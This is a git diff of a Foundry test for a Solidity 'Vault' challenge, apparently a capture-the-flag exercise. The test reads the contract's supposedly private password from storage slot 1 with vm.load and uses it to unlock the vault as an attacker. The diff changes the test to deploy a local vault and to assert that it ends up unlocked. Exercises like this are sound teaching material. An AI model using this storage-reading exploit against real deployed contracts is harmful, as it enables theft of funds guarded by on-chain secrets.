@@ -10,7 +10,7 @@ contract VaultTest is Test{
     address attacker = mkaddr("attacker");
    
     function setUp() public {
-        vaultAddress = Vault(0x1DCDD5d9A47e4A8773e3E28020B53ceA559BAeFd);
+        vaultAddress = new Vault("I love solidity");
     }
 
     function testExploitVault() public{
@@ -19,7 +19,7 @@ contract VaultTest is Test{
         //fetch the password from storage slot 1
         bytes32 password = vm.load(address(vaultAddress), bytes32(uint256(1)));
         vaultAddress.unlock(password);
-        assertEq(vaultAddress.locked(), true);
+        assertEq(vaultAddress.locked(), false);
         vm.stopPrank();
     }
 
